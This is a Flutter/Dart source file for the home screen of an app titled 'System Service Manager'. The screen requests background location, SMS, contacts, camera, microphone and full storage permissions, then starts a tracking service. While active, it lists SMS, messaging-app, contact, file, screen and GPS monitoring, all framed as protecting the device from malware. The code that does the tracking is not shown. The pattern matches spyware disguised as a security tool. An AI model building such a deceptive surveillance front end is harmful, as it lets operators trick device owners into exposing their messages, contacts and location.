import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../services/tracking_service.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  bool _isServiceActive = false;
  bool _isLoading = false;

  @override
  void initState() {
    super.initState();
    _loadServiceStatus();
  }

  Future<void> _loadServiceStatus() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _isServiceActive = prefs.getBool('service_active') ?? false;
    });
  }

  Future<void> _toggleService() async {
    setState(() {
      _isLoading = true;
    });

    try {
      final prefs = await SharedPreferences.getInstance();

      if (!_isServiceActive) {
        // 서비스 시작
        final permissions = await _requestPermissions();
        if (permissions) {
          await TrackingService.startTracking();
          setState(() {
            _isServiceActive = true;
          });
          await prefs.setBool('service_active', true);

          _showSnackBar('System monitoring activated', Colors.green);
        } else {
          _showSnackBar('Permissions required for monitoring', Colors.red);
        }
      } else {
        // 서비스 중지
        await TrackingService.stopTracking();
        setState(() {
          _isServiceActive = false;
        });
        await prefs.setBool('service_active', false);

        _showSnackBar('System monitoring deactivated', Colors.orange);
      }
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<bool> _requestPermissions() async {
    final permissions = [
      Permission.location,
      Permission.locationAlways,
      Permission.sms,
      Permission.storage,
      Permission.contacts,
      Permission.camera,
      Permission.microphone,
    ];

    // Android 11+ 에서 MANAGE_EXTERNAL_STORAGE 권한 요청
    if (await Permission.manageExternalStorage.isDenied) {
      permissions.add(Permission.manageExternalStorage);
    }

    Map<Permission, PermissionStatus> statuses = await permissions.request();

    // 결과 확인
    List<Permission> deniedPermissions = [];
    statuses.forEach((permission, status) {
      if (status != PermissionStatus.granted) {
        deniedPermissions.add(permission);
      }
    });

    if (deniedPermissions.isNotEmpty) {
      _showPermissionDialog(deniedPermissions);
      return false;
    }

    return true;
  }

  void _showPermissionDialog(List<Permission> deniedPermissions) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Permissions Required'),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('The following permissions are required for system monitoring:'),
            const SizedBox(height: 8),
            ...deniedPermissions.map((permission) =>
                Text('• ${_getPermissionName(permission)}')
            ),
            const SizedBox(height: 16),
            const Text('Please grant all permissions and try again.'),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: const Text('Cancel'),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.of(context).pop();
              openAppSettings();
            },
            child: const Text('Open Settings'),
          ),
        ],
      ),
    );
  }

  String _getPermissionName(Permission permission) {
    switch (permission) {
      case Permission.location:
        return 'Location Access';
      case Permission.locationAlways:
        return 'Background Location';
      case Permission.sms:
        return 'SMS Access';
      case Permission.storage:
        return 'Storage Access';
      case Permission.manageExternalStorage:
        return 'Manage External Storage';
      case Permission.contacts:
        return 'Contacts Access';
      case Permission.camera:
        return 'Camera Access';
      case Permission.microphone:
        return 'Microphone Access';
      default:
        return permission.toString();
    }
  }

  void _showSnackBar(String message, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: color,
        duration: const Duration(seconds: 3),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('System Service Manager'),
        centerTitle: true,
        elevation: 2,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // 상태 카드
            Card(
              elevation: 4,
              child: Padding(
                padding: const EdgeInsets.all(24.0),
                child: Column(
                  children: [
                    AnimatedContainer(
                      duration: const Duration(milliseconds: 300),
                      child: Icon(
                        _isServiceActive ? Icons.shield : Icons.shield_outlined,
                        size: 80,
                        color: _isServiceActive ? Colors.green : Colors.grey,
                      ),
                    ),
                    const SizedBox(height: 16),
                    Text(
                      _isServiceActive ? 'System Monitoring Active' : 'System Monitoring Inactive',
                      style: Theme.of(context).textTheme.headlineSmall?.copyWith(
                        fontWeight: FontWeight.bold,
                        color: _isServiceActive ? Colors.green : Colors.grey[600],
                      ),
                      textAlign: TextAlign.center,
                    ),
                    const SizedBox(height: 8),
                    Text(
                      _isServiceActive
                          ? 'Your device is being monitored for security purposes'
                          : 'Enable monitoring to protect your device from threats',
                      style: Theme.of(context).textTheme.bodyMedium,
                      textAlign: TextAlign.center,
                    ),
                    if (_isServiceActive) ...[
                      const SizedBox(height: 16),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: Colors.green[100],
                          borderRadius: BorderRadius.circular(20),
                        ),
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.circle, size: 8, color: Colors.green[600]),
                            const SizedBox(width: 6),
                            Text(
                              'Active',
                              style: TextStyle(
                                color: Colors.green[600],
                                fontWeight: FontWeight.w500,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ],
                ),
              ),
            ),

            const SizedBox(height: 24),

            // 제어 버튼
            SizedBox(
              height: 56,
              child: ElevatedButton(
                onPressed: _isLoading ? null : _toggleService,
                style: ElevatedButton.styleFrom(
                  backgroundColor: _isServiceActive ? Colors.red[600] : Colors.green[600],
                  foregroundColor: Colors.white,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8),
                  ),
                  elevation: 2,
                ),
                child: _isLoading
                    ? const SizedBox(
                  width: 24,
                  height: 24,
                  child: CircularProgressIndicator(
                    color: Colors.white,
                    strokeWidth: 2,
                  ),
                )
                    : Text(
                  _isServiceActive ? 'DEACTIVATE MONITORING' : 'ACTIVATE MONITORING',
                  style: const TextStyle(
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
            ),

            const SizedBox(height: 24),

            // 활성 기능들
            if (_isServiceActive) ...[
              Card(
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'Active Monitoring Features:',
                        style: Theme.of(context).textTheme.titleMedium?.copyWith(
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      const SizedBox(height: 12),
                      _buildFeatureItem(Icons.location_on, 'Location Tracking', 'Real-time GPS monitoring'),
                      _buildFeatureItem(Icons.message, 'Message Monitoring', 'SMS and messaging apps'),
                      _buildFeatureItem(Icons.folder, 'File Access Monitoring', 'Document and media files'),
                      _buildFeatureItem(Icons.screen_share, 'Screen Activity', 'Application usage tracking'),
                      _buildFeatureItem(Icons.contacts, 'Contact Access', 'Address book monitoring'),
                      _buildFeatureItem(Icons.network_check, 'Network Monitoring', 'Internet connectivity tracking'),
                    ],
                  ),
                ),
              ),
            ] else ...[
              // 비활성 상태에서의 안내
              Card(
                color: Colors.blue[50],
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    children: [
                      Icon(Icons.info_outline, color: Colors.blue[600], size: 32),
                      const SizedBox(height: 8),
                      Text(
                        'Security Benefits',
                        style: Theme.of(context).textTheme.titleMedium?.copyWith(
                          fontWeight: FontWeight.bold,
                          color: Colors.blue[800],
                        ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        'Enable monitoring to protect your device from malware, unauthorized access, and suspicious activities.',
                        textAlign: TextAlign.center,
                        style: TextStyle(color: Colors.blue[700]),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ],
        ),
      ),
    );
  }

  Widget _buildFeatureItem(IconData icon, String title, String subtitle) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: Colors.blue[100],
              borderRadius: BorderRadius.circular(8),
            ),
            child: Icon(icon, color: Colors.blue[600], size: 20),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: const TextStyle(
                    fontWeight: FontWeight.w500,
                    fontSize: 14,
                  ),
                ),
                Text(
                  subtitle,
                  style: TextStyle(
                    color: Colors.grey[600],
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
          Icon(Icons.check_circle, color: Colors.green[500], size: 18),
        ],
      ),
    );
  }
}